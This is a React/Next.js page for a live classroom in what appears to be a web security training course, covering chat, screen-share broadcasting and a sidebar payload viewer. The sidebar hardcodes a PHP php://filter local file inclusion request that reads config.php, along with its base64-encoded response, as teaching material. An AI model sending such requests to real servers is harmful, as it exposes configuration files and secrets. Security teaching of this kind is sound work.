'use client';

import { useState, useEffect, useRef } from 'react';
import Link from 'next/link';
import { supabase } from '@/lib/supabase';

export default function LiveClassroom() {
  const [scheduleId, setScheduleId] = useState('SCH-101');

  const [activeTab, setActiveTab] = useState('chat');
  const [messages, setMessages] = useState([]);
  const [chatText, setChatText] = useState('');
  const [micOn, setMicOn] = useState(false);
  const [camOn, setCamOn] = useState(true);
  const [currentUser, setCurrentUser] = useState({ name: 'Tanvir Hossain', role: 'student', watermarkText: 'STD-1001 • Tanvir Hossain • 10.10.14.5' });
  
  // Live Stream & Screen Sharing state
  const [liveStream, setLiveStream] = useState({ isSharing: false, broadcasterName: '', frame: null });
  const [isLocalSharing, setIsLocalSharing] = useState(false);
  const [activeMeetLink, setActiveMeetLink] = useState('');

  const localVideoRef = useRef(null);
  const screenStreamRef = useRef(null);
  const broadcastIntervalRef = useRef(null);
  const chatEndRef = useRef(null);

  const scrollToBottom = () => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      const sId = params.get('scheduleId');
      if (sId) setScheduleId(sId);
    }

    const userStr = localStorage.getItem('arena_user');
    if (userStr) {
      try {
        const u = JSON.parse(userStr);
        setCurrentUser({
          ...u,
          watermarkText: `${u.id || 'USER'} • ${u.name} • ${u.batchId || 'BATCH'} • CONFIDENTIAL`
        });
      } catch (e) {}
    }
  }, []);

  useEffect(() => {
    if (!scheduleId) return;

    // Load initial chat history & live stream state directly from Supabase
    fetchChatMessages(scheduleId);
    pollLiveStream();

    // 1. Fast polling fallback every 1000ms for live screen frames
    const interval = setInterval(() => {
      pollLiveStream();
    }, 1000);

    // 2. Supabase Realtime Subscription for chat comments
    const chatChannel = supabase
      .channel(`realtime_chat_${scheduleId}`)
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'chat_messages', filter: `schedule_id=eq.${scheduleId}` },
        (payload) => {
          if (payload.new) {
            setMessages(prev => {
              const map = new Map();
              prev.forEach(m => map.set(m.id, m));
              map.set(payload.new.id, payload.new);
              return Array.from(map.values());
            });
          }
        }
      )
      .subscribe();

    // 3. Supabase Realtime Subscription for Live Screen Share Frames (<100ms)
    const streamChannel = supabase
      .channel('realtime_live_stream_channel_v3')
      .on(
        'postgres_changes',
        { event: '*', schema: 'public', table: 'live_stream' },
        (payload) => {
          if (payload.new && !isLocalSharing) {
            setLiveStream({
              isSharing: !!payload.new.is_sharing,
              broadcasterName: payload.new.broadcaster_name || 'Instructor',
              frame: payload.new.frame || null
            });
          }
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(chatChannel);
      supabase.removeChannel(streamChannel);
    };
  }, [scheduleId, isLocalSharing]);

  const fetchChatMessages = async (classId) => {
    try {
      const { data, error } = await supabase
        .from('chat_messages')
        .select('*')
        .eq('schedule_id', classId)
        .order('created_at', { ascending: true });

      if (!error && data) {
        setMessages(data);
      } else {
        const res = await fetch(`/api/chat/messages?scheduleId=${classId}`);
        const apiData = await res.json();
        if (apiData.success && apiData.messages) {
          setMessages(apiData.messages);
        }
      }
    } catch (e) {}
  };

  const pollLiveStream = async () => {
    try {
      // Direct Supabase query for screen frame
      const { data } = await supabase.from('live_stream').select('is_sharing, broadcaster_name, frame').eq('id', 1).single();
      if (data && !isLocalSharing) {
        setLiveStream({
          isSharing: !!data.is_sharing,
          broadcasterName: data.broadcaster_name || 'Instructor',
          frame: data.frame || null
        });
      }

      // API route fallback
      const res = await fetch('/api/stream/live');
      const apiData = await res.json();
      if (apiData.success) {
        if (apiData.activeMeetLink) setActiveMeetLink(apiData.activeMeetLink);
      }
    } catch (e) {}
  };

  // Toggle Screen Share using HTML5 navigator.mediaDevices.getDisplayMedia
  const handleToggleScreenShare = async () => {
    if (isLocalSharing) {
      stopScreenSharing();
    } else {
      try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
          alert('Screen sharing is not supported on this browser/device.');
          return;
        }

        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: { cursor: 'always' },
          audio: false
        });

        screenStreamRef.current = stream;
        setIsLocalSharing(true);

        if (localVideoRef.current) {
          localVideoRef.current.srcObject = stream;
          localVideoRef.current.play().catch(() => {});
        }

        // Detect native browser "Stop Sharing" floating bar click
        stream.getVideoTracks()[0].onended = () => {
          stopScreenSharing();
        };

        // Start broadcasting captured frames from localVideoRef
        startBroadcastingFrames();

      } catch (err) {
        console.error('Screen capture error:', err);
      }
    }
  };

  const stopScreenSharing = async () => {
    setIsLocalSharing(false);
    if (broadcastIntervalRef.current) {
      clearInterval(broadcastIntervalRef.current);
      broadcastIntervalRef.current = null;
    }

    if (screenStreamRef.current) {
      screenStreamRef.current.getTracks().forEach(t => t.stop());
      screenStreamRef.current = null;
    }

    if (localVideoRef.current) {
      localVideoRef.current.srcObject = null;
    }

    setLiveStream({ isSharing: false, broadcasterName: '', frame: null });

    // Broadcast stop signal to Supabase
    try {
      await supabase.from('live_stream').upsert([{
        id: 1,
        is_sharing: false,
        broadcaster_name: currentUser.name,
        frame: null,
        updated_at: new Date().toISOString()
      }]);
    } catch (e) {}

    const token = localStorage.getItem('arena_token');
    try {
      await fetch('/api/stream/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ isSharing: false, broadcasterName: currentUser.name, frame: null })
      });
    } catch (e) {}
  };

  const startBroadcastingFrames = () => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    if (broadcastIntervalRef.current) clearInterval(broadcastIntervalRef.current);

    broadcastIntervalRef.current = setInterval(async () => {
      const videoEl = localVideoRef.current;
      if (videoEl && videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
        canvas.width = Math.min(videoEl.videoWidth, 800);
        canvas.height = Math.min(videoEl.videoHeight, 450);
        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

        const frameData = canvas.toDataURL('image/jpeg', 0.45);
        const token = localStorage.getItem('arena_token');

        // 1. Direct Supabase Update for Instant Realtime Broadcast to All Students
        try {
          await supabase.from('live_stream').upsert([{
            id: 1,
            is_sharing: true,
            broadcaster_name: currentUser.name,
            frame: frameData,
            updated_at: new Date().toISOString()
          }]);
        } catch (e) {}

        // 2. API route fallback
        try {
          await fetch('/api/stream/broadcast', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
            body: JSON.stringify({ isSharing: true, frame: frameData, broadcasterName: currentUser.name })
          });
        } catch (e) {}
      }
    }, 500);
  };

  const handleSendChat = async (e) => {
    e.preventDefault();
    if (!chatText.trim()) return;

    const textToSend = chatText;
    setChatText('');

    const newMsg = {
      id: `MSG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      schedule_id: scheduleId,
      author: `${currentUser.name} (${(currentUser.role || 'student').toUpperCase()})`,
      role: currentUser.role || 'student',
      text: textToSend,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    setMessages(prev => {
      const map = new Map();
      prev.forEach(m => map.set(m.id, m));
      map.set(newMsg.id, newMsg);
      return Array.from(map.values());
    });

    try {
      await supabase.from('chat_messages').insert([newMsg]);
    } catch (err) {}

    try {
      const token = localStorage.getItem('arena_token');
      await fetch('/api/chat/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ text: textToSend, authorName: currentUser.name, scheduleId })
      });
    } catch (err) {}
  };

  return (
    <div style={{ background: '#030712', minHeight: '100vh', padding: '16px', display: 'flex', flexDirection: 'column' }}>
      
      {/* Top Header Bar */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px', background: '#090D16', padding: '12px 20px', borderRadius: '12px', border: '1px solid var(--bg-card-border)', flexWrap: 'wrap', gap: '12px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div className="brand-logo" style={{ width: '34px', height: '34px', fontSize: '1.1rem' }}>🛡️</div>
          <div>
            <h2 style={{ fontSize: '1.05rem', fontWeight: 800 }}>Batch 1 — Web Security & Bug Bounty Live Session</h2>
            <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>Instructor: Rahat Chowdhury | Session ID: {scheduleId}</span>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
          {activeMeetLink && (
            <a href={activeMeetLink} target="_blank" rel="noopener noreferrer" className="btn btn-cyan btn-sm">
              🟢 Join Google Meet Room
            </a>
          )}
          <span className="badge badge-rose">🔴 LIVE ZOOM SDK CANVAS</span>
          <Link href="/student" className="btn btn-outline btn-sm">
            🚪 Exit Session
          </Link>
        </div>
      </div>

      {/* Main Classroom Layout */}
      <div className="classroom-container">
        
        {/* Main Video Canvas Area */}
        <div className="video-main-area">
          <div className="video-canvas">
            
            {/* Dynamic Security Watermark */}
            <div className="dynamic-watermark">
              {currentUser.watermarkText}
            </div>

            {/* Local Screen Share Preview Video Element (Teacher View) */}
            <video
              ref={localVideoRef}
              autoPlay
              playsInline
              muted
              style={{
                display: isLocalSharing ? 'block' : 'none',
                width: '100%',
                height: '100%',
                objectFit: 'contain',
                background: '#000'
              }}
            />

            {/* Remote Screen Share Broadcast Frame (For Students & Auditors View) */}
            {!isLocalSharing && (
              liveStream.isSharing && liveStream.frame ? (
                <img src={liveStream.frame} alt="Teacher Screen Broadcast" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
              ) : (
                <div className="video-placeholder">
                  <div className="avatar-large">RC</div>
                  <h3 style={{ fontSize: '1.25rem', fontWeight: 700 }}>Rahat Chowdhury (Instructor)</h3>
                  <p style={{ color: 'var(--text-muted)', fontSize: '0.85rem', marginTop: '4px' }}>
                    {liveStream.isSharing ? `Broadcasting Desktop Screen (${liveStream.broadcasterName})` : 'Microphone Active • Click Share Screen Below to Stream'}
                  </p>
                </div>
              )
            )}

            {/* Active Speaker Info Overlay */}
            <div className="video-overlay-info">
              <span className="status-indicator live"></span>
              <span><strong>{isLocalSharing ? currentUser.name : (liveStream.broadcasterName || 'Rahat Chowdhury')}</strong> (Host)</span>
            </div>

          </div>

          {/* Bottom Toolbar Controls */}
          <div className="video-controls-bar">
            <div className="control-group">
              <button className={`ctrl-btn ${micOn ? 'active' : 'off'}`} onClick={() => setMicOn(!micOn)} title="Toggle Mic">
                {micOn ? '🎙️' : '🔇'}
              </button>
              <button className={`ctrl-btn ${camOn ? 'active' : 'off'}`} onClick={() => setCamOn(!camOn)} title="Toggle Camera">
                {camOn ? '📹' : '🚫'}
              </button>
              
              {/* Screen Share Control Button for Instructors / Presenters */}
              <button
                className={`btn ${isLocalSharing ? 'btn-danger' : 'btn-purple'} btn-sm`}
                onClick={handleToggleScreenShare}
                style={{ marginLeft: '10px', display: 'flex', alignItems: 'center', gap: '6px' }}
              >
                {isLocalSharing ? '⏹️ Stop Screen Share' : '🖥️ Share Screen Live'}
              </button>
            </div>

            <div className="control-group">
              <div className="timer-badge">
                ⏱️ 01:42:15
              </div>
            </div>

            <div className="control-group">
              <Link href="/student" className="end-class-btn">
                Leave Classroom
              </Link>
            </div>
          </div>
        </div>

        {/* Sidebar Tabs: Live Chat & Code Viewer */}
        <div className="classroom-sidebar">
          <div className="sidebar-tabs">
            <button className={`tab-btn ${activeTab === 'chat' ? 'active' : ''}`} onClick={() => setActiveTab('chat')}>
              💬 Live Chat ({messages.length})
            </button>
            <button className={`tab-btn ${activeTab === 'payload' ? 'active' : ''}`} onClick={() => setActiveTab('payload')}>
              💻 Payload / Code
            </button>
          </div>

          {/* Chat Tab Content */}
          <div className={`tab-content ${activeTab === 'chat' ? 'active' : ''}`}>
            <div className="chat-messages" style={{ overflowY: 'auto', maxHeight: 'calc(100vh - 280px)', paddingRight: '6px' }}>
              {messages.map((m) => (
                <div className="chat-msg" key={m.id}>
                  <div className="author">
                    <span>{m.author}</span>
                    <span className="time">{m.time}</span>
                  </div>
                  <div style={{ color: 'var(--text-main)', marginTop: '2px' }}>{m.text}</div>
                </div>
              ))}
              <div ref={chatEndRef} />
            </div>

            <form onSubmit={handleSendChat} className="chat-input-box">
              <input
                type="text"
                className="form-control"
                placeholder="Ask question or type message..."
                value={chatText}
                onChange={(e) => setChatText(e.target.value)}
                style={{ fontSize: '0.82rem' }}
              />
              <button type="submit" className="btn btn-primary btn-sm">
                Send
              </button>
            </form>
          </div>

          {/* Payload / Code Viewer Tab Content */}
          <div className={`tab-content ${activeTab === 'payload' ? 'active' : ''}`}>
            <h4 style={{ fontSize: '0.85rem', fontWeight: 700, marginBottom: '8px', color: 'var(--cyan)' }}>
              Live Payload Snippet from Instructor:
            </h4>
            <div className="code-viewer">
{`# PHP Base64 Filter Wrapper Exploit Payload
GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: 10.10.14.5
User-Agent: ArenaSecurityScanner/1.0
Accept: */*

# Response Base64 Output:
PD9waHAgJGZhbGc9IkFSRU5Be2xmaV9maWx0M3JfYnlwNHNzXzIwMjZ9Ijs/Pg==`}
            </div>
          </div>

        </div>

      </div>
    </div>
  );
}
